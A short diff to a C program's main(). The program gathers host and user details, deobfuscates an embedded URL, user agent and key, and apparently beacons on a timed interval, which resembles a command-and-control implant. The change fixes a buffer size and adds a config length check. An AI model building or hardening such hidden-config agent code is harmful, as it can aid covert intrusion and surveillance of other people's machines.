@@ -316,7 +316,7 @@ static double next_interval(void) {
 
 int main(void) {
     char hostname[256] = {0}, username[256] = {0}, os[128] = {0}, arch[64] = {0};
-    unsigned char secret[32];
+    unsigned char secret[33]; /* 33: deob 在末尾补 NUL */
     unsigned char idhash[32];
     buf_t kctx = {0, 0, 0}, idb = {0, 0, 0}, results = {0, 0, 0};
     uint32_t pid = 0;
@@ -325,6 +325,7 @@ int main(void) {
     size_t i;
 
     if (sys_init() != 0) return 1;
+    if (CFG_URL_LEN >= sizeof g_url) return 1; /* config 与解码缓冲不匹配，拒绝运行 */
     deob(CFG_URL, CFG_URL_LEN, g_url);
     deob(CFG_UA, CFG_UA_LEN, g_ua);
     deob(CFG_JSON_KEY, CFG_JSON_KEY_LEN, g_json_key);
